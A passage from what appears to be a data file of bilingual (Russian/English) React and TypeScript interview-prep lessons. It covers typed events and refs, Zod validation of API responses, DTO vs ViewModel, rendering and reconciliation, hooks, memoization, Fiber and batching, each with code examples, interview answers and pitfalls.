            "Каждый тип события в React имеет специализированный TypeScript-тип — React.ChangeEvent<HTMLInputElement> для onChange инпута, React.FormEvent<HTMLFormElement> для onSubmit формы, React.KeyboardEvent<HTMLInputElement> для onKeyDown — параметр-дженерик указывает, каким конкретно будет event.currentTarget, что даёт корректный автокомплит для currentTarget.value, currentTarget.checked и подобных полей. Важно различать event.target и event.currentTarget: target — это элемент, на котором событие реально произошло (может быть дочерним, если событие всплыло), тогда как currentTarget — это именно тот элемент, на котором навешан обработчик, и в TypeScript только currentTarget типизирован дженериком из сигнатуры события. Для обработчиков, объявленных вне JSX (не инлайново), тип события нужно указывать вручную в сигнатуре функции, иначе TypeScript не сможет вывести его автоматически.",
          codeExample:
            "function SearchInput() {\n  const handleChange = (event: React.ChangeEvent<HTMLInputElement>) => {\n    console.log(event.currentTarget.value); // строго типизировано как string\n  };\n\n  const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {\n    event.preventDefault();\n  };\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <input onChange={handleChange} />\n    </form>\n  );\n}",
          interviewQuestion: "Почему event.target типизирован менее строго, чем event.currentTarget, в обработчиках React?",
          interviewAnswerRu:
            "event.target — это элемент, на котором событие реально возникло, и из-за всплытия (bubbling) им может оказаться любой вложенный дочерний элемент, а не обязательно тот, на который навешан обработчик — поэтому TypeScript типизирует его широко (обычно EventTarget) и не даёт точный набор полей без явного приведения. event.currentTarget — это всегда конкретно тот элемент, где висит обработчик, поэтому его тип точно известен из дженерик-параметра события (например, HTMLInputElement) и включает конкретные поля вроде value или checked без дополнительных приведений типов.",
          interviewAnswerEn:
            "event.target is whichever element the event actually originated on, and due to bubbling that can be any nested child element, not necessarily the one the handler is attached to — so TypeScript types it broadly (typically EventTarget) and doesn't expose specific fields without an explicit cast. event.currentTarget is always exactly the element the handler is attached to, so its type is known precisely from the event's generic parameter (e.g. HTMLInputElement) and includes concrete fields like value or checked with no extra type casting needed.",
          pitfalls: [
            "Обращаться к event.target.value в обработчике инпута и получать ошибку типов — правильнее использовать event.currentTarget.value.",
            "Забывать указать дженерик-параметр элемента у типа события в обработчике, объявленном отдельно от JSX — тогда автокомплит по currentTarget не работает вовсе.",
          ],
        },
      },
      {
        id: "ts-typing-refs",
        title: "Типизация refs",
        content: {
          title: "Типизация refs",
          shortExplanation:
            "useRef<T>(initialValue) типизируется параметром T, соответствующим либо DOM-элементу (useRef<HTMLInputElement>(null) для ссылки на DOM-узел), либо произвольному изменяемому значению, не связанному с рендером.",
          detailedExplanation:
            "Для DOM-ref типичная сигнатура — useRef<HTMLInputElement>(null): начальное значение null обязательно, потому что реальный DOM-узел появится только после первого рендера, и TypeScript в этом случае выводит тип ref.current как HTMLInputElement | null, поэтому перед использованием (ref.current.focus()) обычно нужна проверка на null. Для 'обычного' изменяемого значения (счётчик рендеров, id таймера, предыдущее значение пропса) используют useRef<number>(0) без null — здесь ref.current сразу имеет конкретный тип без необходимости проверки, потому что начальное значение задаётся сразу, а не появляется позже асинхронно. При передаче ref в дочерний компонент через forwardRef сигнатура выглядит как forwardRef<HTMLInputElement, Props>((props, ref) => ...) — первый параметр дженерика описывает тип самого ref, второй — тип обычных пропсов компонента.",
          codeExample:
            "function AutoFocusInput() {\n  const inputRef = useRef<HTMLInputElement>(null); // DOM-ref: current может быть null\n\n  useEffect(() => {\n    inputRef.current?.focus(); // опциональная цепочка — current может ещё не существовать\n  }, []);\n\n  return <input ref={inputRef} />;\n}\n\nfunction useRenderCount() {\n  const countRef = useRef(0); // обычный изменяемый ref, тип number выведен из 0\n  countRef.current += 1;\n  return countRef.current;\n}",
          interviewQuestion: "Почему useRef<HTMLInputElement>(null).current имеет тип HTMLInputElement | null, а не сразу HTMLInputElement?",
          interviewAnswerRu:
            "Потому что реальный DOM-узел, на который ссылается ref, физически не существует до тех пор, пока React не выполнит commit и не примонтирует элемент в DOM — на момент объявления useRef мы можем передать только null как начальное значение. TypeScript честно отражает это в типе: ref.current — это HTMLInputElement | null, и обращение к нему без проверки на null (или без опциональной цепочки ?.) — ошибка компиляции, которая защищает от попытки вызвать метод на ещё не существующем узле.",
          interviewAnswerEn:
            "Because the actual DOM node the ref points to physically doesn't exist until React finishes the commit phase and mounts the element into the DOM — at the point useRef is declared, we can only pass null as the initial value. TypeScript honestly reflects this in the type: ref.current is HTMLInputElement | null, and accessing it without a null check (or optional chaining ?.) is a compile error that guards against calling a method on a node that doesn't exist yet.",
          pitfalls: [
            "Обращаться к ref.current напрямую без проверки на null сразу после объявления useRef, до того как компонент реально смонтирован.",
            "Типизировать 'обычный' изменяемый ref (не DOM) как принимающий null там, где начальное значение задаётся сразу и null логически невозможен.",
          ],
        },
      },
      {
        id: "ts-typing-api-responses",
        title: "Типизация ответов API",
        content: {
          title: "Типизация ответов API",
          shortExplanation:
            "Ответ fetch/axios по умолчанию нетипизирован (any или unknown после .json()), поэтому реальную типовую защиту даёт либо ручное описание интерфейса ответа, либо runtime-валидация схемой (Zod/Yup), которая одновременно проверяет данные и выводит из схемы TypeScript-тип.",
          detailedExplanation:
            "response.json() в fetch возвращает Promise<any> — TypeScript не может статически знать форму данных, которые реально пришли по сети, поэтому простое приведение через as ApiResponse — это лишь обещание программиста, ничем не подкреплённое в рантайме: если бэкенд изменит форму ответа, приложение продолжит компилироваться, но сломается в рантайме на реальных данных. Правильный подход — runtime-валидация: описать схему через Zod (const UserSchema = z.object({ id: z.string(), name: z.string() })) и получить TypeScript-тип автоматически через z.infer<typeof UserSchema>, а сам ответ прогонять через UserSchema.parse(rawData), которая одновременно и проверяет данные в рантайме, и даёт типобезопасный результат. Для пограничных случаев (ответ может быть успехом или ошибкой) хорошей практикой является явный discriminated union ApiResult<T> = { status: 'success'; data: T } | { status: 'error'; error: string } вместо смешивания необязательных полей в одном плоском объекте.",
          codeExample:
            "import { z } from 'zod';\n\nconst UserSchema = z.object({ id: z.string(), name: z.string(), email: z.string().email() });\ntype User = z.infer<typeof UserSchema>; // тип выводится из схемы автоматически\n\nasync function fetchUser(id: string): Promise<User> {\n  const response = await fetch(`/api/users/${id}`);\n  const rawData = await response.json(); // any — пока не провалидировано\n  return UserSchema.parse(rawData); // бросит ошибку, если форма не совпадает; иначе — User\n}",
          interviewQuestion: "Почему as ApiResponse после response.json() не даёт реальной типовой безопасности?",
          interviewAnswerRu:
            "as — это приведение типа только на уровне компилятора, оно не выполняет никакой проверки в рантайме: TypeScript просто 'верит' программисту и позволяет дальше работать с данными, будто они точно имеют указанную форму. Если реальный ответ сервера отличается (поле переименовано, тип изменился, поле отсутствует), код всё равно скомпилируется без единой ошибки, а сломается уже в продакшене на реальном трафике — то есть as просто откладывает обнаружение проблемы с этапа компиляции на этап выполнения у реальных пользователей.",
          interviewAnswerEn:
            "as is purely a compile-time cast — it performs no runtime check whatsoever: TypeScript simply trusts the programmer and lets the code proceed as if the data definitely has that shape. If the actual server response differs (a field got renamed, a type changed, a field is missing), the code still compiles without a single error and only breaks in production on real traffic — so as merely defers discovering the problem from compile time to runtime, in front of real users.",
          pitfalls: [
            "Приводить ответ API через as вместо реальной runtime-валидации и узнавать о рассинхронизации схем только по багам в продакшене.",
            "Описывать ответ API одним плоским интерфейсом с кучей необязательных полей вместо discriminated union success/error.",
          ],
        },
      },
      {
        id: "ts-dto-vs-viewmodel",
        title: "DTO vs ViewModel",
        content: {
          title: "DTO vs ViewModel",
          shortExplanation:
            "DTO (Data Transfer Object) — это форма данных, в точности как их присылает сервер по контракту API; ViewModel — это форма тех же данных, преобразованная под нужды конкретного экрана/компонента UI, и эти две формы не обязаны совпадать.",
          detailedExplanation:
            "DTO часто содержит поля, неудобные или избыточные для UI напрямую: даты строками в ISO-формате вместо объектов Date, вложенные id вместо разрешённых объектов, поля, названные по бэкенд-соглашениям (snake_case), избыточные технические поля (внутренние версии записи, служебные флаги). ViewModel — это результат маппинга DTO во что-то удобное конкретно для рендера: отформатированные строки дат, вычисленные производные поля (fullName из firstName + lastName), переименованные под фронтенд-конвенции ключи, отфильтрованные ненужные для этого экрана данные. Разделение DTO и ViewModel — это защитный слой на границе приложения: если бэкенд поменяет форму ответа, меняется только маппер (DTO -> ViewModel) в одном месте, а не десятки компонентов, которые полагались бы на сырую форму API напрямую по всему приложению.",
          codeExample:
            "// DTO — форма ответа сервера как есть\ninterface UserDto {\n  user_id: string;\n  first_name: string;\n  last_name: string;\n  created_at: string; // ISO-строка\n}\n\n// ViewModel — форма, удобная для UI\ninterface UserViewModel {\n  id: string;\n  fullName: string;\n  memberSince: Date;\n}\n\nfunction toViewModel(dto: UserDto): UserViewModel {\n  return {\n    id: dto.user_id,\n    fullName: `${dto.first_name} ${dto.last_name}`,\n    memberSince: new Date(dto.created_at),\n  };\n}",
          interviewQuestion: "Зачем вводить отдельный слой ViewModel, если компоненты и так могут использовать DTO напрямую?",
          interviewAnswerRu:
            "Если компоненты напрямую завязаны на форму DTO, любое изменение контракта API (переименование поля, смена формата даты, реструктуризация вложенности) вынуждает переписывать все компоненты, которые эти данные используют, по всему приложению. Слой ViewModel с явным маппером изолирует это изменение в одном месте — маппере, а компоненты продолжают работать со стабильной, специально спроектированной под UI формой данных, независимо от того, что реально поменялось на бэкенде.",
          interviewAnswerEn:
            "If components are wired directly to the DTO shape, any API contract change (a renamed field, a different date format, restructured nesting) forces you to rewrite every component that consumes that data across the whole app. A ViewModel layer with an explicit mapper isolates that change to one place — the mapper — while components keep working against a stable, UI-designed data shape regardless of what actually changed on the backend.",
          pitfalls: [
            "Пропускать DTO напрямую в глубоко вложенные компоненты без единого места трансформации — изменение контракта API рассыпается по всему дереву компонентов.",
            "Делать ViewModel 'один в один' с DTO без реальной пользы — тогда это просто лишний слой без добавленной ценности.",
          ],
        },
      },

    ],
  },


  // ---------------------------------------------------------------------
  // REACT
  // ---------------------------------------------------------------------
  {
    id: "react",
    title: "React",
    subtopics: [
      {
        id: "react-rendering",
        title: "Rendering",
        content: {
          title: "Rendering (рендеринг)",
          shortExplanation:
            "Rendering — это процесс, в котором React вызывает функцию компонента, чтобы получить описание того, что должно быть на экране (дерево React-элементов из JSX). Сам по себе рендер — это только вычисление в памяти, а не изменение DOM: реальные DOM-узлы обновляются позже, в отдельной фазе commit.",
          detailedExplanation:
            "Рендер запускается по одной из трёх причин: изменился собственный state компонента, изменился контекст, который он читает, или ре-рендерится родитель (тогда по умолчанию React вызывает и все дочерние компоненты, даже без изменения их пропсов). В момент рендера React буквально вызывает вашу функцию-компонент как обычную JS-функцию. JSX внутри неё — это синтаксический сахар над React.createElement(...), поэтому результатом вызова является не разметка, а обычное дерево JS-объектов (React Element Tree, часто называемое 'виртуальным DOM'). На этом этапе браузер ещё ни при чём — это чистое вычисление в памяти.\n\nДальше наступает фаза reconciliation ('согласование'): React сравнивает новое дерево элементов с деревом от предыдущего рендера — по типу узла и его key — и вычисляет минимальный набор реальных изменений, которые нужно применить. Если на одном и том же месте в дереве раньше был <button>, а теперь снова <button> с другим текстом, React обновит только текстовый узел внутри, а не пересоздаст DOM-элемент с нуля. Если же тип элемента изменился (например, <button> заменился на <a>), старый DOM-узел будет полностью удалён, а новый создан заново — вместе со всем состоянием дочерних компонентов внутри него.\n\nТолько после того, как список изменений посчитан, React переходит к фазе commit — именно здесь и только здесь браузерный DOM реально меняется, срабатывают браузерные layout/paint, и уже после этого запускаются эффекты (useEffect/useLayoutEffect). Если diffing показал, что менять нечего (новое дерево элементов идентично предыдущему), commit может быть пустым: React 'отрендерил' компонент — то есть вызвал функцию и посчитал разницу — но ни один DOM-узел на самом деле не тронул.\n\nИз этого следует важное практическое правило: функция компонента должна быть чистой (pure) по отношению к рендеру — не мутировать внешние переменные, не делать сетевые запросы и не трогать DOM напрямую прямо в теле функции. React не гарантирует, что вызовет компонент ровно один раз за одно обновление: в React Strict Mode (только в development) компоненты намеренно вызываются дважды подряд, чтобы выявить именно такие побочные эффекты, спрятанные в рендере. Всё, что должно происходить 'взаправду' — запрос данных, подписка на событие, ручная работа с DOM — должно жить в useEffect, который React запускает уже после commit, а не во время самого рендера.\n\nНа практике эта разница между 'рендер' и 'commit' — то, что чаще всего путают при оптимизации производительности. React DevTools Profiler показывает именно рендеры (сколько раз вызывалась функция и сколько это заняло времени), а не только реальные изменения DOM — поэтому компонент может показывать 'ре-рендерился 50 раз' в профайлере, при этом ни разу не изменив ни одного пикселя на экране. Умение отличать 'лишний вызов функции' от 'лишнего обновления DOM' — это как раз то, что дальше разбирается в темах Re-render и Memoization.",
          codeExample:
            "function Counter() {\n  const [count, setCount] = useState(0);\n  console.log('render'); // вызывается при каждом рендере\n  return (\n    <button onClick={() => setCount(count + 1)}>\n      Count: {count}\n    </button>\n  );\n}",
          interviewQuestion: "Что происходит в React, когда вы говорите 'компонент отрендерился'?",
          interviewAnswerRu:
            "Это значит, что React вызвал функцию компонента, получил новое дерево элементов и сравнил его с предыдущим через reconciliation. Если есть реальные отличия, React обновит DOM в фазе commit.",
          interviewAnswerEn:
            "It means React called the component function again, produced a new element tree, and diffed it against the previous one via reconciliation. If there are real differences, React applies them to the DOM during the commit phase.",
          pitfalls: [
            "Путать 'рендер' с 'обновлением DOM' — это разные фазы.",
            "Считать, что рендер компонента — это всегда дорого; часто дорога не сама функция, а побочные эффекты внутри неё.",
          ],
          practiceTask:
            "Добавьте console.log в компонент и понаблюдайте, сколько раз он рендерится при разных действиях: клик по кнопке внутри компонента, клик по кнопке в родителе, изменение несвязанного состояния.",
          resources: {
            docs: [
              { title: "Render and Commit — React docs", url: "https://react.dev/learn/render-and-commit" },
            ],
            articles: [
              { title: "A Complete Guide to useEffect (Dan Abramov)", url: "https://overreacted.io/a-complete-guide-to-useeffect/" },
            ],
          },
        },
      },
      {
        id: "react-re-render",
        title: "Re-render",
        content: {
          title: "Re-render (повторный рендер)",
          shortExplanation:
            "Re-render — это повторный вызов компонента, который происходит из-за изменения state, пропсов или контекста, либо из-за ре-рендера родителя.",
          detailedExplanation:
            "React ре-рендерит компонент в трёх основных случаях: изменился его собственный state, изменился контекст, который он читает, или ре-рендерится родитель (тогда по умолчанию ре-рендерятся и все дети, даже если их пропсы не менялись). Это нормальное поведение React, а не баг. Проблемой это становится, когда ре-рендер происходит слишком часто или затрагивает тяжёлые части дерева — тогда используют memo, useMemo, useCallback или пересмотр структуры компонентов (composition).",
          codeExample:
            "function Parent() {\n  const [tick, setTick] = useState(0);\n  return (\n    <div>\n      <button onClick={() => setTick(t => t + 1)}>tick</button>\n      {/* Child ре-рендерится при каждом клике, даже без пропсов */}\n      <Child />\n    </div>\n  );\n}",
          interviewQuestion: "Почему дочерний компонент ре-рендерится, если его пропсы не изменились?",
          interviewAnswerRu:
            "Потому что по умолчанию React ре-рендерит всех детей при ре-рендере родителя, независимо от того, изменились ли их пропсы. Чтобы этого избежать, компонент нужно обернуть в React.memo — тогда React сравнит пропсы и пропустит рендер, если они не изменились (по ссылке).",
          interviewAnswerEn:
            "By default React re-renders all children whenever the parent re-renders, regardless of whether their props changed. Wrapping the child in React.memo makes React shallow-compare props and skip the render if they are referentially equal.",
          pitfalls: [
            "Оборачивать всё подряд в memo 'на всякий случай' — это добавляет накладные расходы на сравнение пропсов.",
            "Забывать, что новый объект/массив/функция в пропсах каждый рендер делает memo бесполезным.",
          ],
          practiceTask:
            "Сделайте Parent с состоянием и Child без пропсов. Оберните Child в React.memo и проверьте через console.log, ре-рендерится ли он теперь при изменении state в Parent.",
          resources: {
            docs: [
              { title: "memo — React docs", url: "https://react.dev/reference/react/memo" },
            ],
            articles: [
              { title: "Why React Re-Renders (Josh W. Comeau)", url: "https://www.joshwcomeau.com/react/why-react-re-renders/" },
            ],
          },
        },
      },
      {
        id: "react-custom-hooks",
        title: "Custom Hooks",
        content: {
          title: "Custom Hooks (собственные хуки)",
          shortExplanation:
            "Custom hook — это обычная функция, имя которой начинается с 'use', которая переиспользует логику работы со state и эффектами между компонентами.",
          detailedExplanation:
            "Кастомные хуки не добавляют новых возможностей React — они просто позволяют вынести повторяющуюся логику (например, подписку на события, работу с localStorage, debounce) в отдельную переиспользуемую функцию. Внутри кастомного хука можно использовать любые другие хуки (useState, useEffect, другие кастомные хуки). Главное правило — соблюдать 'Rules of Hooks': вызывать хуки только на верхнем уровне функции и только в React-функциях (компонентах или других хуках).",
          codeExample:
            "function useWindowWidth() {\n  const [width, setWidth] = useState(window.innerWidth);\n  useEffect(() => {\n    const onResize = () => setWidth(window.innerWidth);\n    window.addEventListener('resize', onResize);\n    return () => window.removeEventListener('resize', onResize);\n  }, []);\n  return width;\n}",
          interviewQuestion: "Чем custom hook отличается от обычной utility-функции?",
          interviewAnswerRu:
            "Custom hook может использовать состояние, эффекты и другие хуки React и 'подключён' к жизненному циклу компонента, в котором он вызван. Обычная функция этого не может — она не имеет доступа к state и не переживает ре-рендеры сама по себе.",
          interviewAnswerEn:
            "A custom hook can use React state, effects, and other hooks, and it's tied to the lifecycle of the component that calls it. A plain utility function can't do that — it has no access to state and doesn't persist across re-renders on its own.",
          pitfalls: [
            "Вызывать хуки внутри условий, циклов или после return — нарушает Rules of Hooks.",
            "Делать хук слишком 'умным' и завязанным на конкретный компонент — теряется переиспользуемость.",
          ],
          practiceTask:
            "Напишите useLocalStorage(key, initialValue), который читает значение из localStorage при инициализации и синхронизирует его при каждом изменении.",
          resources: {
            docs: [
              { title: "Reusing Logic with Custom Hooks — React docs", url: "https://react.dev/learn/reusing-logic-with-custom-hooks" },
            ],
            articles: [
              { title: "When to useMemo and useCallback (Kent C. Dodds)", url: "https://kentcdodds.com/blog/usememo-and-usecallback" },
            ],
          },
        },
      },
      {
        id: "react-stale-closure",
        title: "Stale Closure",
        content: {
          title: "Stale Closure (устаревшее замыкание)",
          shortExplanation:
            "Stale closure — ситуация, когда функция (например, внутри useEffect или setTimeout) 'помнит' старое значение переменной из предыдущего рендера, а не актуальное.",
          detailedExplanation:
            "Каждый рендер компонента создаёт новые замыкания для всех функций внутри него, включая обработчики событий и колбэки в useEffect. Если такая функция сохраняется 'надолго' (например, через setTimeout, setInterval или подписку на событие) и в её теле список зависимостей useEffect указан неверно (например, пустой массив), функция продолжит использовать значения переменных из того рендера, в котором была создана — даже если state с тех пор изменился.",
          codeExample:
            "function Timer() {\n  const [count, setCount] = useState(0);\n  useEffect(() => {\n    const id = setInterval(() => {\n      console.log(count); // всегда 0 — stale closure\n    }, 1000);\n    return () => clearInterval(id);\n  }, []); // count не в зависимостях\n  return <button onClick={() => setCount(c => c + 1)}>+1</button>;\n}",
          interviewQuestion: "Почему в setInterval внутри useEffect count всегда остаётся 0?",
          interviewAnswerRu:
            "Потому что useEffect с пустым массивом зависимостей выполняется один раз, и функция внутри setInterval замыкает переменную count из того самого первого рендера. Исправить можно, добавив count в зависимости, используя функциональное обновление setCount(c => c + 1), или храня актуальное значение в useRef.",
          interviewAnswerEn:
            "Because the effect runs only once (empty dependency array), the callback inside setInterval closes over the count value from that very first render. Fixes include adding count to the dependency array, using the functional update form setCount(c => c + 1), or keeping the latest value in a ref.",
          pitfalls: [
            "Указывать неполный массив зависимостей, чтобы 'убрать warning', вместо того чтобы понять причину.",
            "Не использовать функциональные обновления state там, где это решает проблему проще, чем правка зависимостей.",
          ],
          practiceTask:
            "Воспроизведите баг из примера, затем исправьте его двумя разными способами: через зависимости useEffect и через useRef.",
          resources: {
            docs: [
              { title: "Synchronizing with Effects — React docs", url: "https://react.dev/learn/synchronizing-with-effects" },
            ],
            articles: [
              { title: "Be Aware of Stale Closures when Using React Hooks (Dmitri Pavlutin)", url: "https://dmitripavlutin.com/react-hooks-stale-closures/" },
              { title: "A Complete Guide to useEffect (Dan Abramov)", url: "https://overreacted.io/a-complete-guide-to-useeffect/" },
            ],
          },
        },
      },
      {
        id: "react-memoization",
        title: "Memoization",
        content: {
          title: "Memoization (мемоизация)",
          shortExplanation:
            "Мемоизация — это кэширование результата вычисления или объекта, чтобы не пересоздавать его при каждом рендере без необходимости.",
          detailedExplanation:
            "В React для мемоизации есть три основных инструмента: useMemo — кэширует значение (например, результат тяжёлого вычисления или новый объект/массив), useCallback — кэширует ссылку на функцию, React.memo — кэширует результат рендера всего компонента на основе сравнения пропсов. Мемоизация не ускоряет сам первый рендер — она помогает избежать повторной работы при последующих рендерах, если входные данные не изменились.",
          codeExample:
            "const sortedItems = useMemo(\n  () => items.slice().sort((a, b) => a.value - b.value),\n  [items]\n);\n\nconst handleClick = useCallback(() => {\n  onSelect(id);\n}, [id, onSelect]);",
          interviewQuestion: "Когда мемоизация действительно даёт выигрыш, а когда только усложняет код?",
          interviewAnswerRu:
            "Мемоизация полезна, когда вычисление реально тяжёлое (сортировка/фильтрация больших списков) или когда стабильная ссылка нужна для React.memo дочернего компонента или как зависимость другого хука. Если вычисление дешёвое, useMemo только добавляет накладные расходы на сравнение зависимостей и усложняет чтение кода.",
          interviewAnswerEn:
            "Memoization pays off when the computation is genuinely expensive (sorting/filtering large lists) or when a stable reference is needed for a memoized child component or as a dependency of another hook. For cheap computations, useMemo just adds the overhead of comparing dependencies and makes the code harder to read.",
          pitfalls: [
            "Мемоизировать всё подряд 'для перфоманса' без профилирования.",
            "Забывать полный список зависимостей в useMemo/useCallback, получая устаревшие значения.",
          ],
          practiceTask:
            "Возьмите список из 10 000 элементов, добавьте тяжёлую сортировку без useMemo и с useMemo, сравните через React DevTools Profiler.",
          resources: {
            docs: [
              { title: "useMemo — React docs", url: "https://react.dev/reference/react/useMemo" },
            ],
            articles: [
              { title: "When to useMemo and useCallback (Kent C. Dodds)", url: "https://kentcdodds.com/blog/usememo-and-usecallback" },
            ],
          },
        },
      },
      {
        id: "react-component-lifecycle",
        title: "Component Lifecycle",
        content: {
          title: "Component Lifecycle",
          shortExplanation:
            "Жизненный цикл компонента — последовательность этапов от появления в дереве (mount) через обновления (update) до удаления (unmount); в функциональных компонентах он выражается не отдельными методами, а комбинацией самого рендера и useEffect с разными наборами зависимостей.",
          detailedExplanation:
            "В классовых компонентах жизненный цикл был явным набором методов: componentDidMount (после первого рендера), componentDidUpdate (после каждого последующего), componentWillUnmount (перед удалением). В функциональных компонентах эти три момента выражаются через один и тот же хук: useEffect(fn, []) эквивалентен didMount, useEffect(fn, [dep]) — didUpdate применительно к конкретной зависимости, а функция, возвращённая из useEffect, играет роль willUnmount и вызывается перед следующим запуском эффекта или перед размонтированием. Важное отличие функциональной модели: разработчик описывает эффект как синхронизацию с конкретными значениями (зависимостями), а не привязывается к фазам жизни компонента напрямую — React сам решает, когда нужно 'отменить' предыдущий эффект и 'применить' новый.",
          codeExample:
            "function ChatRoom({ roomId }) {\n  useEffect(() => {\n    const connection = connectToRoom(roomId); // аналог componentDidMount/didUpdate\n    return () => connection.disconnect();     // аналог componentWillUnmount\n  }, [roomId]); // эффект пересинхронизируется при смене roomId\n\n  return <div>Room: {roomId}</div>;\n}",
          interviewQuestion: "Как один useEffect с массивом зависимостей заменяет три отдельных lifecycle-метода классового компонента?",
          interviewAnswerRu:
            "useEffect(fn, [roomId]) выполняет fn после первого рендера (аналог componentDidMount) и повторно — после каждого рендера, где изменился roomId (аналог componentDidUpdate именно для этой зависимости). Функция очистки, возвращённая из fn, вызывается перед каждым следующим запуском эффекта и перед размонтированием компонента — это покрывает и 'обновление с очисткой предыдущего состояния', и componentWillUnmount одним и тем же механизмом, без отдельных методов для каждого случая.",
          interviewAnswerEn:
            "useEffect(fn, [roomId]) runs fn after the first render (mirroring componentDidMount) and again after any render where roomId changed (mirroring componentDidUpdate for that specific dependency). The cleanup function returned from fn runs before every subsequent run of the effect and before unmount — covering both 'update with cleanup of previous state' and componentWillUnmount through the same single mechanism, without separate methods for each case.",
          pitfalls: [
            "Переносить логику классовых lifecycle-методов 1-в-1 без переосмысления зависимостей — часто приводит к лишним или недостающим перезапускам эффекта.",
            "Забывать функцию очистки там, где эффект подписывается на что-то внешнее (WebSocket, addEventListener, таймер).",
          ],
        },
      },
      {
        id: "react-reconciliation",
        title: "Reconciliation",
        content: {
          title: "Reconciliation (согласование)",
          shortExplanation:
            "Reconciliation — алгоритм, которым React сравнивает новое дерево элементов с предыдущим и вычисляет минимальный набор изменений, которые реально нужно применить к DOM.",
          detailedExplanation:
            "React сравнивает деревья не полным попарным сравнением каждого узла (что было бы O(n^3) и непрактично для UI), а по эвристическому алгоритму с линейной сложностью O(n), основанному на двух допущениях: элементы разных типов дают разные деревья (поэтому React полностью пересоздаёт поддерево при смене типа узла, а не пытается 'подогнать' его), и key помогает идентифицировать, какие элементы списка остались теми же между рендерами, даже если их порядок изменился. Без key (или с key={index}) React сопоставляет элементы списка по позиции, что при вставке/удалении элемента в середину списка приводит к неверному сопоставлению — состояние 'съезжает' на другие элементы. С правильным стабильным key (например, id записи) React корректно понимает, какой именно DOM-узел соответствует какому элементу данных, даже если порядок или состав списка изменился.",
          codeExample:
            "// Плохо: key={index} — при вставке элемента в начало все key 'сдвигаются'\n{items.map((item, index) => <Item key={index} {...item} />)}\n\n// Хорошо: стабильный key из данных, не зависящий от позиции\n{items.map((item) => <Item key={item.id} {...item} />)}",
          interviewQuestion: "Почему использование index в качестве key может приводить к багам при изменении списка?",
          interviewAnswerRu:
            "React использует key, чтобы понять, какой элемент списка на предыдущем рендере соответствует какому элементу на новом — это нужно, чтобы сохранить локальное состояние и DOM-узел именно за 'тем же' логическим элементом, а не пересоздавать всё заново. Если key — это просто index, а элемент вставили или удалили в середине списка, все последующие элементы 'сдвигают' свои key, и React ошибочно решает, что это те же самые элементы данных, просто с изменившимся содержимым — из-за этого локальное состояние (например, значение инпута) может 'прилипнуть' не к тому элементу.",
          interviewAnswerEn:
            "React uses key to figure out which item from the previous render corresponds to which item in the new one — this is what preserves local state and the DOM node for 'the same' logical item instead of recreating everything from scratch. If key is just the index, and an item gets inserted or removed in the middle of the list, every following item's key shifts, and React wrongly concludes these are the same data items with merely changed content — as a result, local state (like an input's value) can end up stuck on the wrong item.",
          pitfalls: [
            "Использовать index в качестве key для списков, которые могут быть отсортированы, отфильтрованы или в которые можно вставить/удалить элемент в середине.",
            "Считать reconciliation просто 'diff алгоритмом виртуального DOM' без понимания, что он специально устроен эвристически, а не как универсальный точный diff.",
          ],
        },
      },
      {
        id: "react-fiber",
        title: "React Fiber",
        content: {
          title: "React Fiber",
          shortExplanation:
            "Fiber — внутренняя архитектура React (с версии 16), которая представляет дерево компонентов как связный список узлов-'волокон' и позволяет React прерывать, приостанавливать и возобновлять процесс рендера по частям, а не выполнять его одним неразрывным синхронным проходом.",
          detailedExplanation:
            "До Fiber (React 15 и раньше) рендер всего дерева был единой синхронной рекурсивной функцией — прервать её было невозможно, и большое дерево компонентов могло заблокировать основной поток на заметное время, вызывая подвисания интерфейса. Fiber превращает дерево компонентов в связный список узлов с явными ссылками на потомка, следующего 'брата' и родителя — это позволяет React обходить дерево итеративно, кадр за кадром, и в любой момент прерваться, отдать управление браузеру (чтобы он успел обработать ввод пользователя или отрисовать кадр), а затем продолжить с того же места. Именно архитектура Fiber лежит в основе concurrent-режима React: возможности назначать приоритеты разным обновлениям (например, срочный ввод текста важнее фонового обновления списка) и функций вроде useTransition/useDeferredValue, которые бы физически не могли существовать при старой синхронной модели рендера.",
          codeExample:
            "// Fiber работает 'под капотом' — в обычном коде это не видно напрямую,\n// но именно благодаря ему возможны концептуально такие вещи:\nfunction SearchResults({ query }) {\n  const deferredQuery = useDeferredValue(query); // низкоприоритетное обновление\n  // React может прервать рендер тяжёлого списка ниже, если придёт более срочное обновление\n  return <ExpensiveList query={deferredQuery} />;\n}",
          interviewQuestion: "Почему потребовалось переписать движок рендера React на архитектуру Fiber?",
          interviewAnswerRu:
            "Старая (pre-Fiber) реализация обходила дерево компонентов рекурсивно и синхронно — начатый рендер невозможно было прервать посередине, поэтому при большом дереве или тяжёлых вычислениях внутри рендера интерфейс мог 'подвиснуть' до завершения всего прохода. Fiber представляет дерево как связный список с явными ссылками между узлами, что позволяет обходить его итеративно и прерывать работу в любой точке, отдавая приоритет более срочным обновлениям (пользовательскому вводу) — это стало фундаментом для concurrent-режима React и таких API, как useTransition и Suspense.",
          interviewAnswerEn:
            "The pre-Fiber implementation walked the component tree recursively and synchronously — an in-progress render couldn't be interrupted, so a large tree or heavy work inside render could freeze the UI until the whole pass finished. Fiber represents the tree as a linked list with explicit links between nodes, letting React traverse it iteratively and pause work at any point to prioritize more urgent updates (like user input) — this became the foundation for React's concurrent mode and APIs like useTransition and Suspense.",
          pitfalls: [
            "Считать Fiber 'просто оптимизацией' — на самом деле это смена самой модели выполнения рендера, открывшая целый класс новых возможностей.",
            "Путать Fiber (внутренний механизм планирования работы) с Virtual DOM (структурой данных, описывающей UI) — это связанные, но разные вещи.",
          ],
        },
      },
      {
        id: "react-batching",
        title: "Batching",
        content: {
          title: "Batching (пакетное обновление состояния)",
          shortExplanation:
            "Batching — объединение нескольких вызовов setState, произошедших в рамках одного 'события', в один ре-рендер вместо отдельного ре-рендера на каждый вызов.",
          detailedExplanation:
            "До React 18 batching работал только внутри обработчиков событий React (onClick, onChange) — если несколько setState вызывались внутри setTimeout, промиса или нативного обработчика события, каждый вызов приводил к отдельному синхронному ре-рендеру. С React 18 появился automatic batching: обновления батчатся независимо от того, откуда они вызваны — внутри промисов, таймеров, нативных обработчиков — что заметно уменьшает количество лишних рендеров без каких-либо изменений в коде компонентов. Если по какой-то причине нужно принудительно получить синхронный рендер сразу после конкретного setState (редкий случай, обычно для измерения DOM сразу после обновления), для этого существует flushSync, который явно выходит из батчинга для конкретного обновления.",
          codeExample:
